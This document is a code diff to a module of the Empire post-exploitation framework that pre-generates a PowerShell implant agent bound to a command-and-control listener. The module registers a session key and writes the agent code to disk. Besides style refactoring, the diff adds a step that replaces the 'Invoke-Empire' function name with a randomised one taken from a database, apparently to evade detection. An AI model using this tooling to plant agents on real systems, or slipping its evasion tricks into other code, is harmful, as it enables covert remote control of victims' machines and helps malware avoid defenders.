@@ -1,8 +1,10 @@
 from __future__ import print_function
-from builtins import object
+
 import os
 import string
-from pydispatch import dispatcher
+
+# Empire imports
+from builtins import object
 from lib.common import helpers
 
 
@@ -36,20 +38,20 @@ class Module(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Listener' : {
-                'Description'   :   'Listener to generate the agent for.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Listener': {
+                'Description': 'Listener to generate the agent for.',
+                'Required': True,
+                'Value': ''
             },
-            'Language' : {
-                'Description'   :   'Language to generate for the agent.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Language': {
+                'Description': 'Language to generate for the agent.',
+                'Required': True,
+                'Value': ''
             },
-            'OutFile' : {
-                'Description'   :   'Output file to write the agent code to.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/agent'
+            'OutFile': {
+                'Description': 'Output file to write the agent code to.',
+                'Required': True,
+                'Value': '/tmp/agent'
             }
         }
 
@@ -65,70 +67,85 @@ class Module(object):
 
     def execute(self):
 
-        listenerName = self.options['Listener']['Value']
+        listener_name = self.options['Listener']['Value']
         language = self.options['Language']['Value']
-        outFile = self.options['OutFile']['Value']
+        out_file = self.options['OutFile']['Value']
 
-        if listenerName not in self.mainMenu.listeners.activeListeners:
+        if listener_name not in self.mainMenu.listeners.activeListeners:
             print(helpers.color("[!] Error: %s not an active listener"))
             return None
 
-        activeListener = self.mainMenu.listeners.activeListeners[listenerName]
+        active_listener = self.mainMenu.listeners.activeListeners[listener_name]
 
-        chars = string.uppercase + string.digits
-        sessionID = helpers.random_string(length=8, charset=chars)
+        chars = string.ascii_uppercase + string.digits
+        session_id = helpers.random_string(length=8, charset=chars)
 
-        stagingKey = activeListener['options']['StagingKey']['Value']
-        delay = activeListener['options']['DefaultDelay']['Value']
-        jitter = activeListener['options']['DefaultJitter']['Value']
-        profile = activeListener['options']['DefaultProfile']['Value']
-        killDate = activeListener['options']['KillDate']['Value']
-        workingHours = activeListener['options']['WorkingHours']['Value']
-        lostLimit = activeListener['options']['DefaultLostLimit']['Value']
-        if 'Host' in activeListener['options']:
-            host = activeListener['options']['Host']['Value']
+        staging_key = active_listener['options']['StagingKey']['Value']
+        delay = active_listener['options']['DefaultDelay']['Value']
+        jitter = active_listener['options']['DefaultJitter']['Value']
+        profile = active_listener['options']['DefaultProfile']['Value']
+        kill_date = active_listener['options']['KillDate']['Value']
+        working_hours = active_listener['options']['WorkingHours']['Value']
+        lost_limit = active_listener['options']['DefaultLostLimit']['Value']
+        if 'Host' in active_listener['options']:
+            host = active_listener['options']['Host']['Value']
         else:
             host = ''
 
         # add the agent
-        self.mainMenu.agents.add_agent(sessionID, '0.0.0.0', delay, jitter, profile, killDate, workingHours, lostLimit, listener=listenerName, language=language)
+        self.mainMenu.agents.add_agent(session_id, '0.0.0.0', delay, jitter, profile, kill_date, working_hours,
+                                       lost_limit,
+                                       listener=listener_name, language=language)
 
         # get the agent's session key
-        sessionKey = self.mainMenu.agents.get_agent_session_key_db(sessionID)
+        session_key = self.mainMenu.agents.get_agent_session_key_db(session_id)
 
-        agentCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_agent(activeListener['options'], language=language)
+        agent_code = self.mainMenu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
+            active_listener['options'], language=language)
 
         if language.lower() == 'powershell':
-            agentCode += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (host, stagingKey, sessionKey, sessionID)
+            agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
+                host, staging_key, session_key, session_id)
         else:
             print(helpers.color('[!] Only PowerShell agent generation is supported at this time.'))
             return ''
 
+        # Get the random function name generated at install and patch the stager with the proper function name
+        conn = self.mainMenu.get_db_connection()
+        self.mainMenu.lock.acquire()
+        cur = conn.cursor()
+        cur.execute("SELECT Invoke_Empire FROM functions")
+        replacement = cur.fetchone()
+        cur.close()
+        self.mainMenu.lock.release()
+        agent_code = agent_code.replace("Invoke-Empire", replacement[0])
+
         # TODO: python agent generation - need to patch in crypto functions from the stager...
 
-        print(helpers.color("[+] Pre-generated agent '%s' now registered." % (sessionID)))
+        print(helpers.color("[+] Pre-generated agent '%s' now registered." % session_id))
 
         # increment the supplied file name appropriately if it already exists
         i = 1
-        outFileOrig = outFile
-        while os.path.exists(outFile):
-            parts = outFileOrig.split('.')
+        out_file_orig = out_file
+        while os.path.exists(out_file):
+            parts = out_file_orig.split('.')
             if len(parts) == 1:
-                base = outFileOrig
+                base = out_file_orig
                 ext = None
             else:
                 base = '.'.join(parts[0:-1])
                 ext = parts[-1]
 
             if ext:
-                outFile = "%s%s.%s" % (base, i, ext)
+                out_file = "%s%s.%s" % (base, i, ext)
             else:
-                outFile = "%s%s" % (base, i)
+                out_file = "%s%s" % (base, i)
             i += 1
 
-        f = open(outFile, 'w')
-        f.write(agentCode)
+        f = open(out_file, 'w')
+        f.write(agent_code)
         f.close()
 
-        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (language, listenerName, sessionID, outFile)))
+        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (
+            language, listener_name, session_id, out_file)))
         print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
